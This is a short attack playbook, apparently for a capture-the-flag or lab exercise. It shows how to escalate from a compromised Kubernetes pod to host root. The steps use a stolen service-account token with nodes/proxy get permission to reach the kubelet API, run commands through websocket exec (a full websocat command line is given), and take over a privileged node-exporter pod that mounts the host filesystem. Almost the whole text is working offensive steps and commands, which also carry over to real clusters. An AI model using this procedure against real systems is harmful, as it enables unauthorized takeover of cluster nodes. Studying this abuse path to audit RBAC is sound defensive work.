# Kubernetes `nodes/proxy get` → kubelet exec → root via hostPath pod

Use after compromising a pod and reading `/var/run/secrets/kubernetes.io/serviceaccount/token`, when `SelfSubjectRulesReview`/`kubectl auth can-i --list` shows `nodes/proxy [get]` (and no `pods/exec`).

## Procedure

1. Check permissions: `kubectl --token=$TOKEN --server=https://API:443 auth can-i --list`.
2. Kubelet 10250 is usually cluster-only. Reach it from inside a pod (or SSH tunnel from a host that can):
   `curl -sk https://NODE_IP:10250/pods -H "Authorization: Bearer $TOKEN"`.
3. `POST /run/<ns>/<pod>/<container>?cmd=id` returns 403 `verb=create` — do not use it.
4. Use websocket `exec`, which is a GET and only needs `nodes/proxy get`:
   little-endian-free handshake with `Sec-WebSocket-Protocol: v4.channel.k8s.io`, then read binary frames (first payload byte = channel: 0 stdin, 1 stdout, 2 stderr, 3 error, 4 status).
   `websocat --insecure --header "Authorization: Bearer $TOKEN" --protocol v4.channel.k8s.io "wss://NODE:10250/exec/NS/POD/CONT?output=1&error=1&command=/bin/sh&command=-c&command=id"`
5. Pick a privileged pod with a host mount — typically `prometheus-node-exporter` (root, `hostPath: /`). Find it in the `/pods` listing.
6. Locate the host root inside that pod (`/host`, sometimes nested e.g. `/host/root`), then `cat` the flag. `id` should show `uid=0`.

## Pitfalls

- `/run` looks simpler but requires `create` on `nodes/proxy`; websocket `exec` needs only `get`.
- Kubelet may not accept a plain `curl` POST for exec; the channel protocol must be negotiated as a subprotocol.
- Pod egress to attacker IPs may be filtered: have the exec/tool return stdout instead of a reverse shell.
- Node-exporter mount layout varies; `find /host -maxdepth 4 -name root.txt` before guessing.
